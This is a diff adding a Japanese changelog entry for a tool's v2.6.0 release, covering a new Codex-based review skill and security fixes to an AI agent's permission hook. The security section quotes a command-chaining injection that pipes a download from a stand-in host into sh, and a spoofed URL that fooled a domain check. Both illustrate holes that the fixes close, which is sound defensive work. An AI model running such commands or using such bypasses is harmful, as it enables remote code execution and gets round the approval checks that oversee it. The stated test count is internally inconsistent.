@@ -1,5 +1,48 @@
 # Changelog
 
+## [2.6.0] - 2026-05-15
+
+### 概要
+
+Codex CLI との連携スキル `codex-review` を新設。Codex を code-reviewer / security-reviewer ペルソナとして動かし、Claude とは異なる視点でのレビューを可能にする。あわせて Codex と Claude の並列レビューで発見されたセキュリティ問題を `permission_handler.py` と `cli_ask.py` に対して修正した。
+
+### 追加
+
+#### `codex-review` スキル新設 (`.claude/skills/codex-review/`)
+
+Codex CLI（`codex exec`）に `.codex/agents/` のエージェント定義を読み込ませ、code-reviewer または security-reviewer のペルソナとしてレビューを実行する新スキル。C3 Codex アダプター（`c3 init --platform codex`）がセットアップ済みの場合のみ有効。
+
+- **単一ファイルモード**: 指定ファイルを Codex でレビューし `.claude/reports/` にレポートを保存
+- **ワークフローモード** (`workflow code-reviewer` / `workflow security-reviewer`): `git diff HEAD` の変更差分全体を対象にレビュー。通常ワークフローの Claude レビューと並走させる用途を想定
+- `.codex/agents/{reviewer_type}.toml` の定義をプロンプトに埋め込み、Codex がサブエージェント起動なしに直接ペルソナとして動作
+- レポートは `[CR-XX-NNN]` / `[SR-XX-NNN]` 形式で出力し、通常の C3 レビューと同じ契約を維持
+
+### 修正（セキュリティ）
+
+#### `permission_handler.py` のセキュリティ強化 (`.claude/hooks/permission_handler.py`)
+
+Claude と Codex の並列レビューで検出された脆弱性を修正。
+
+- **Bash シェルコマンドチェーニングの防止**: `Bash(git *)` 等の auto-allow パターンで `;` `&&` `||` バッククォート `$()` を含むコマンドが自動承認されてしまう問題を修正。`git status; curl evil.com | sh` のような注入を防ぐ
+- **WebFetch ドメイン判定の厳密化**: `domain in url` の部分一致を `urlparse().hostname` による完全一致・サブドメイン一致に変更。`https://evil.com?q=trusted.com` のような URL 偽装を防ぐ
+- **Windows 通知の PowerShell インジェクション対策**: `-Command` を `-EncodedCommand`（Base64）に変更しシェル展開を完全排除
+- **macOS 通知の改行エスケープ**: `message` 内の改行を AppleScript に渡す前にスペースへ置換
+- **`tool_input` 型チェック追加**: dict 以外が来た場合の `{}` フォールバックを追加
+- 上記すべてに対してテストを追加（40件 → 計40件、新規11件）
+
+### 修正
+
+#### `cli_ask.py` のバグ修正 (`src/c3/cli_ask.py`)
+
+Codex によるコードレビューで検出された問題を修正。
+
+- **非対話モードでの暗黙デフォルト選択を防止**: `--response` 未指定 + 非対話環境（CI/エージェント実行）で必須質問の先頭選択肢が静かに自動選択されていた問題を修正。エラーメッセージを出して終了するよう変更
+- **`--json` のファイルパス混同を防止**: `--json` に渡した文字列が既存ファイル名と一致した場合にファイルとして読まれる問題を修正。`handle()` 内で `json.loads()` して dict に変換してから `load_questions()` へ渡すよう変更
+- **`EOFError` / `KeyboardInterrupt` の捕捉**: パイプ切断・Ctrl+C でトレースバックが出る問題を修正（`EOFError` → exit 1、`KeyboardInterrupt` → exit 130）
+- **`json.JSONDecodeError` の重複削除**: `ValueError` のサブクラスのため `except` 句から除去
+
+---
+
 ## [2.5.0] - 2026-05-13
 
 ### 概要
